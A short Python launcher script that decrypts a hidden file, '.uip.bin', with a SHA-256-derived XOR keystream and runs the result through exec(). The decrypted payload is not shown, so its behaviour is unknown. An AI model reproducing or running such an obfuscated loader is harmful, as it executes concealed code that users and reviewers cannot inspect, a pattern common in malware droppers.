#!/usr/bin/env python3
import hashlib
import sys
from pathlib import Path

if sys.version_info < (3, 10):
    sys.exit(f"uip: requires Python 3.10+ (running {sys.version.split()[0]})")
_bin = Path(__file__).resolve().parent / ".uip.bin"
if not _bin.is_file():
    sys.exit("uip: runtime data missing")
_d = _bin.read_bytes()
_b = b"\xa4\x9e\x38\x19\x8e\x6c\x9b\xf1\xa9\x0d\x8a\xd1\x2d\xc1\x21\xf5\xc5\x99\x94\xf2\x8c\x85\xec\x6d\x44\xab\x92\xad\xf2\xd2\xa1\x16"
_s = bytearray()
while len(_s) < len(_d):
    _b = hashlib.sha256(_b).digest()
    _s += _b
_code = compile(bytes(x ^ y for x, y in zip(_d, _s)), "uip", "exec")
exec(_code, {"__name__": "__main__", "__file__": str(_bin)})
